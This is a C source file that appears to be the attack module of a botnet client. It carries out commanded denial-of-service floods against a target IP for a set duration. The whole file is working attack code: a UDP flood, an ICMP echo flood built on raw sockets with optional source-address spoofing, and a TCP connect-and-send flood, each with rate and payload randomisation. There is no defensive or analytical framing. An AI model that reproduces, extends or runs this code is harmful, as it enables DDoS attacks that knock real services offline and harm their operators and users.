#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include "attacks.h"
#include "util.h"
#include "rand.h"
#include "syscalls.h"

void attack_free(void)
{
    util_memset(attack_config.target, 0, sizeof(attack_config.target));
    util_memset(attack_config.method, 0, sizeof(attack_config.method));
    util_memset(attack_config.srcip, 0, sizeof(attack_config.srcip));
    util_memset(attack_config.payload, 0, sizeof(attack_config.payload));
    attack_config.packet_len = 0;
    attack_config.repeat = 0;
    attack_config.dest_port = 0;
    attack_config.duration = 0;
    attack_config.minpps = 0;
    attack_config.maxpps = 0;
    attack_config.minlen = 0;
    attack_config.maxlen = 0;
    attack_config.pps = 0;
    attack_config.rand = 0;
}

void attack_init(void)
{
    int pid1, pid2;
#ifdef DEBUG
    printf("[main] attack command received\n");
#endif
    if (attack_config.target == NULL || attack_config.method == NULL || attack_config.duration <= 0 || attack_config.duration >= 3600)
    {
#ifdef DEBUG
        printf("[main] failed to start attack, one of the values are incorrect\n");
#endif
        return;
    }

    pid1 = syscalls_fork();
    if (pid1 == -1 || pid1 > 0)
        return;

    pid2 = syscalls_fork();
    if (pid2 == -1)
        syscalls_exit(0);
    else if (pid2 == 0)
    {
        sleep(attack_config.duration);
        kill(getppid(), 9);
        syscalls_exit(0);
    }
    else
    {
        if (util_strcmp(attack_config.method, "tcpraw") == 0)
        {
#ifdef DEBUG
            printf("[attacks] setting tcpraw flood up\n");
#endif
            attack_method_tcpraw(&attack_config);
            sleep(attack_config.duration + 300); // wait to be killed
        }
        else if (util_strcmp(attack_config.method, "icmpecho") == 0)
        {
#ifdef DEBUG
            printf("[attacks] setting icmpecho flood up\n");
#endif
            attack_method_icmpecho(&attack_config);
            sleep(attack_config.duration + 300); // wait to be killed
        }
        else if (util_strcmp(attack_config.method, "udpplain") == 0)
        {
#ifdef DEBUG
            printf("[attacks] setting icmpecho flood up\n");
#endif
            attack_method_udpplain(&attack_config);
            sleep(attack_config.duration + 300); // wait to be killed
        }
        else
        {
#ifdef DEBUG
            printf("[attacks] failed to start attack, one of the values are incorrect\n");
#endif
            sleep(attack_config.duration + 300); // wait to be killed
        }
    }
}

unsigned short attack_checksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void attack_method_udpplain(struct attack_configuration *config)
{
    rand_init();

    if (config->dest_port <= 0 || config->dest_port > 65535)
        config->dest_port = 10000 + rand_next() % (65535 - 10000);

    if ((config->minpps > 0 && config->minpps <= (ATTACKS_MAXPPS - 1)) && (config->maxpps > config->minpps && config->maxpps <= ATTACKS_MAXPPS))
        config->pps = config->minpps + rand_next() % (config->maxpps - config->minpps);

    if (util_strlen(config->payload) >= 1)
        config->packet_len = util_strlen(config->payload);
    else
    {
        if ((config->minlen > 0 && config->minlen <= (ATTACKS_MAXLEN - 1)) && (config->maxlen > config->minlen && config->maxlen <= ATTACKS_MAXLEN))
            config->packet_len = config->minlen + rand_next() % (config->maxlen - config->minlen);
        else
        {
            if (config->packet_len <= 0 || config->packet_len >= ATTACKS_MAXLEN)
                config->packet_len = 1024;
        }

        rand_string(config->payload, config->packet_len);
    }

#ifdef DEBUG
    printf("[attacks/udpplain] flooding %s:%d for %d seconds (packet len: %d)\n", config->target, config->dest_port, config->duration, config->packet_len);
#endif

    struct sockaddr_in sock_addr, bind_addr;
    int fd_sock;

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = HTONS(config->dest_port);
    sock_addr.sin_addr.s_addr = inet_addr(config->target);

    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = HTONS(10000 + rand_next() % (65535 - 10000));
    bind_addr.sin_addr.s_addr = 0;

    if ((fd_sock = syscalls_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    {
#ifdef DEBUG
        printf("[attacks/udpplain] failed to open socket\n");
#endif
        sleep(config->duration + 5);
        return;
    }

    if (bind(fd_sock, (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[attacks/udpplain] failed to bind to socket\n");
#endif
    }

    if (connect(fd_sock, &sock_addr, sizeof(sock_addr)) < 0)
    {
#ifdef DEBUG
        printf("[attacks/udpplain] failed to connect to socket\n");
#endif
    }

    if (config->pps != 0)
    {
        while (1)
        {
            int i = 0;
            for (i = 0; i < config->pps; i++)
            {
                if (config->rand == 1)
                    rand_string(config->payload, config->packet_len);

                send(fd_sock, config->payload, config->packet_len, MSG_NOSIGNAL);
            }

            sleep(1);
        }
    }
    else
    {
        while (1)
        {
            if (config->rand == 1)
                rand_string(config->payload, config->packet_len);

            send(fd_sock, config->payload, config->packet_len, MSG_NOSIGNAL);
        }
    }
}

void attack_method_icmpecho(struct attack_configuration *config)
{
    rand_init();

    if (config->dest_port <= 0 || config->dest_port > 65535)
        config->dest_port = 10000 + rand_next() % (65535 - 10000);

    if ((config->minpps > 0 && config->minpps <= (ATTACKS_MAXPPS - 1)) && (config->maxpps > config->minpps && config->maxpps <= ATTACKS_MAXPPS))
        config->pps = config->minpps + rand_next() % (config->maxpps - config->minpps);

    if (util_strlen(config->payload) >= 1)
        config->packet_len = util_strlen(config->payload);
    else
    {
        if ((config->minlen > 0 && config->minlen <= (ATTACKS_MAXLEN - 1)) && (config->maxlen > config->minlen && config->maxlen <= ATTACKS_MAXLEN))
            config->packet_len = config->minlen + rand_next() % (config->maxlen - config->minlen);
        else
        {
            if (config->packet_len <= 0 || config->packet_len >= ATTACKS_MAXLEN)
                config->packet_len = 1024;
        }

        rand_string(config->payload, config->packet_len);
    }

    struct sockaddr_in sock_addr;
    int fd_sock, on = 1;

    sock_addr.sin_family = AF_INET;
    sock_addr.sin_port = HTONS(config->dest_port);
    sock_addr.sin_addr.s_addr = inet_addr(config->target);

    if ((fd_sock = syscalls_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
#ifdef DEBUG
        printf("[attacks/icmpecho] failed to open socket\n");
#endif
        sleep(config->duration + 5);
        return;
    }

    if (setsockopt(fd_sock, IPPROTO_IP, IP_HDRINCL, (const char *)&on, sizeof(on)) == -1)
    {
#ifdef DEBUG
        printf("[attacks/icmpecho] cant set sock opt IP_HDRINCL\n");
#endif
        sleep(config->duration + 5);
        return;
    }

    if (setsockopt(fd_sock, SOL_SOCKET, SO_BROADCAST, (const char *)&on, sizeof(on)) == -1)
    {
#ifdef DEBUG
        printf("[attacks/icmpecho] cant set sock opt SO_BROADCAST\n");
#endif
        sleep(config->duration + 5);
        return;
    }

#ifdef DEBUG
    printf("[attacks/icmpecho] flooding %s:%d for %d seconds (packet len: %d)\n", config->target, config->dest_port, config->duration, config->packet_len);
#endif

    char packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + config->packet_len];
    struct iphdr *ip = (struct iphdr *)packet;
    struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));

    util_memset(packet, 0, sizeof(packet));
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = HTONS(config->packet_len);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;

    if (util_strlen(config->srcip) >= 7)
        ip->saddr = inet_addr(config->srcip);
    else
        ip->saddr = util_local_addr();

    ip->daddr = sock_addr.sin_addr.s_addr;
    ip->id = 10000 + rand_next() % (65535 - 10000);

    if (config->pps != 0)
    {
        while (1)
        {
            int i = 0;

            for (i = 0; i < config->pps; i++)
            {
                icmp->type = ICMP_ECHO;
                icmp->code = 0;
                icmp->un.echo.sequence = 10000 + rand_next() % (65535 - 10000);
                icmp->un.echo.id = 10000 + rand_next() % (65535 - 10000);

                if (config->rand == 1)
                    rand_string(config->payload, config->packet_len);

                util_memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), config->payload, config->packet_len);
                icmp->checksum = 0;
                icmp->checksum = attack_checksum((unsigned short *)icmp, sizeof(struct icmphdr) + config->packet_len);

                sendto(fd_sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + config->packet_len, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
            }

            sleep(1);
        }
    }
    else
    {
        while (1)
        {
            icmp->type = ICMP_ECHO;
            icmp->code = 0;
            icmp->un.echo.sequence = 10000 + rand_next() % (65535 - 10000);
            icmp->un.echo.id = 10000 + rand_next() % (65535 - 10000);

            if (config->rand == 1)
                rand_string(config->payload, config->packet_len);

            util_memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), config->payload, config->packet_len);
            icmp->checksum = 0;
            icmp->checksum = attack_checksum((unsigned short *)icmp, sizeof(struct icmphdr) + config->packet_len);

            sendto(fd_sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + config->packet_len, 0, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
        }
    }
}

void attack_method_tcpraw(struct attack_configuration *config)
{
    rand_init();

    if (config->dest_port <= 0 || config->dest_port > 65535)
        config->dest_port = 10000 + rand_next() % (65535 - 10000);

    if ((config->minpps > 0 && config->minpps <= (ATTACKS_MAXPPS - 1)) && (config->maxpps > config->minpps && config->maxpps <= ATTACKS_MAXPPS))
        config->pps = config->minpps + rand_next() % (config->maxpps - config->minpps);

    if (util_strlen(config->payload) >= 1)
        config->packet_len = util_strlen(config->payload);
    else
    {
        if ((config->minlen > 0 && config->minlen <= (ATTACKS_MAXLEN - 1)) && (config->maxlen > config->minlen && config->maxlen <= ATTACKS_MAXLEN))
            config->packet_len = config->minlen + rand_next() % (config->maxlen - config->minlen);
        else
        {
            if (config->packet_len <= 0 || config->packet_len >= ATTACKS_MAXLEN)
                config->packet_len = 1024;
        }

        rand_string(config->payload, config->packet_len);
    }

#ifdef DEBUG
    printf("[attacks/tcpraw] flooding %s:%d for %d seconds (packet len: %d)\n", config->target, config->dest_port, config->duration, config->packet_len);
#endif

    if (config->pps != 0)
    {
        while (1)
        {
            int i = 0;

            for (i = 0; i < config->pps; i++)
            {
                struct sockaddr_in sock_addr;
                int fd_sock;

                if ((fd_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
                {
                    sleep(config->duration + 5);
                    return;
                }

                sock_addr.sin_family = AF_INET;
                sock_addr.sin_port = HTONS(config->dest_port);
                sock_addr.sin_addr.s_addr = inet_addr(config->target);

                if (connect(fd_sock, &sock_addr, sizeof(sock_addr)) < 0)
                {
#ifdef DEBUG
                    printf("[attacks/tcpraw] failed to connect to socket\n");
#endif
                    syscalls_close(fd_sock);
                    continue;
                }

                if (config->repeat == 0)
                {
                    while (1)
                    {
                        if (config->rand == 1)
                            rand_string(config->payload, config->packet_len);

                        if (send(fd_sock, config->payload, config->packet_len, 0) < 0)
                            break;
                    }
                }
                else
                {
                    int i = 0;

                    for (i = 0; i < config->repeat; i++)
                    {
                        if (config->rand == 1)
                            rand_string(config->payload, config->packet_len);

                         if (send(fd_sock, config->payload, config->packet_len, 0) < 0)
                             break;
                    }
                }

                util_memset(&sock_addr, 0, sizeof(sock_addr));
                syscalls_close(fd_sock);
            }

            sleep(1);
        }
    }
    else
    {
        while (1)
        {
            struct sockaddr_in sock_addr;
            int fd_sock;

            if ((fd_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
            {
                sleep(config->duration + 5);
                return;
            }

            sock_addr.sin_family = AF_INET;
            sock_addr.sin_port = HTONS(config->dest_port);
            sock_addr.sin_addr.s_addr = inet_addr(config->target);

            if (connect(fd_sock, &sock_addr, sizeof(sock_addr)) < 0)
            {
#ifdef DEBUG
                printf("[attacks/tcpraw] failed to connect to socket\n");
#endif
                syscalls_close(fd_sock);
                continue;
            }

            if (config->repeat == 0)
            {
                while (1)
                {
                    if (config->rand == 1)
                        rand_string(config->payload, config->packet_len);

                    if (send(fd_sock, config->payload, config->packet_len, 0) < 0)
                        break;
                }
            }
            else
            {
                int i = 0;

                for (i = 0; i < config->repeat; i++)
                {
                    if (config->rand == 1)
                        rand_string(config->payload, config->packet_len);

                     if (send(fd_sock, config->payload, config->packet_len, 0) < 0)
                         break;
                }
            }

            util_memset(&sock_addr, 0, sizeof(sock_addr));
            syscalls_close(fd_sock);
        }
    }
}
